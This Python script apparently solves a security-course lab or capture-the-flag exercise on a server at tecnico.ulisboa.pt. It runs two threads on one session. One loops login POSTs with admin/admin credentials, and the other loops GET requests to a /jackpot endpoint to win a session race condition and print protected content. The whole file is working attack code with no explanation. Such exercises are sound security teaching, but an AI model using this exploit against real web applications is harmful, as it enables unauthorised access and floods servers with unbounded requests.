import requests
import threading

session = requests.Session()
site = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22652'
site_jackpot = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22652/jackpot'
site_login = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22652/login'
response = session.get(site)

user = 'admin'
passwd = 'admin'
params = {'username' : user, 'password' : passwd}

def jackpot(session):
    while True:
        print(session.get(site_jackpot).text)

def login(session):
    while True:
        session.post(site_login, data = params)


# create two new threads
t1 = threading.Thread(target=jackpot, args=(session,))
t2 = threading.Thread(target=login, args=(session,))


# start the threads
t1.start()
t2.start()

# wait for the threads to complete
t1.join()
t2.join()